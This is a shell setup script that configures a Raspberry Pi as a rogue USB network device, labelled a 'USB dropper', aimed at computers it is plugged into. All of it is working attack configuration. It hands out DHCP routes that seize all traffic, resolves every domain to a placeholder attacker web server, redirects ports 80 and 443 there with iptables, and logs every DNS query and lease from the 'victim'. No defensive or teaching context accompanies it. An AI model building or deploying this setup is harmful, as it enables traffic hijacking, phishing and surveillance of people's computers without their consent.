# 1. Enable USB gadget mode
echo 'dtoverlay=dwc2' | sudo tee -a /boot/firmware/config.txt
sudo sed -i 's/\brootwait\b/& modules-load=dwc2,g_ether/' /boot/firmware/cmdline.txt

# 2. Configure interface and DHCP
sudo tee -a /etc/dhcpcd.conf >/dev/null <<'EOF'
# ─── USB dropper: dhcpcd settings ───────────────────────────
denyinterfaces wlan0

# USB — dhcpcd only sets a static IP on usb0
interface usb0
static ip_address=10.13.37.1/24
nohook wpa_supplicant
nolink
EOF
sudo ip link set usb0 up
sudo dhcpcd -n usb0

# 3. Configure dnsmasq systemctl
sudo apt install dnsmasq
sudo mkdir -p /etc/systemd/system/dnsmasq.service.d
sudo tee /etc/systemd/system/dnsmasq.service.d/usb0.conf <<'EOF'
[Unit]
After=usb0.device
Requires=usb0.device
EOF

sudo tee /etc/systemd/system/dnsmasq-usb0.service <<'EOF'
[Unit]
Description=Lightweight DHCP/DNS server (Pi USB dropper)
After=network.target
Requires=network.target

[Service]
ExecStart=/usr/sbin/dnsmasq -k --conf-file=/etc/dnsmasq.conf
Type=simple
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl disable --now dnsmasq.service || true
sudo systemctl daemon-reload
sudo systemctl enable --now dnsmasq-usb0.service

# 4. Configure ``dnsmasq`` config file
sudo tee /etc/dnsmasq.conf >/dev/null <<'EOF'
interface=usb0
bind-dynamic

#  ─ DHCP pool ──────────────────────────────────────────
dhcp-range=10.13.37.50,10.13.37.250,12h
dhcp-option=3,10.13.37.1               # default router
dhcp-option=6,10.13.37.1               # DNS

# Win+Unix full-tunnel routes
dhcp-option=121,0.0.0.0/1,10.13.37.1,128.0.0.0/1,10.13.37.1
dhcp-option=249,0.0.0.0/1,10.13.37.1,128.0.0.0/1,10.13.37.1

# Highest DNS priority (systems that honour RFC 9236 / NM extension)
dhcp-option=253,-1

# Wild-card DNS → Target-site
address=/#/YOUR.WEBSERVER.IP

# Log every DNS query
log-queries

# Log DHCP leases (who got what IP and when)
log-dhcp

log-facility=/var/log/dnsmasq.log
EOF
sudo systemctl restart dnsmasq-usb0.service
echo 'nameserver 1.1.1.1' | sudo tee /etc/resolv.conf

# 5. Adding NAT rules
sudo apt install iptables
sudo apt install iptables-persistent
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -t nat -A PREROUTING  -i usb0 -p tcp --dport 80 \
     -j DNAT --to-destination YOUR.WEBSERVER.IP:80
sudo iptables -t nat -A PREROUTING  -i usb0 -p tcp --dport 443 \
     -j DNAT --to-destination YOUR.WEBSERVER.IP:443

# 6. Making IPv4 forwarding persistent     
sudo apt install netfilter-persistent
sudo tee /etc/sysctl.d/30-usb-dropper.conf <<'EOF'
# Forward packets so the Pi can route victim traffic
net.ipv4.ip_forward = 1
EOF
sudo sysctl --system 
sudo netfilter-persistent save
sudo apt install -y dhcpcd5
sudo systemctl enable --now dhcpcd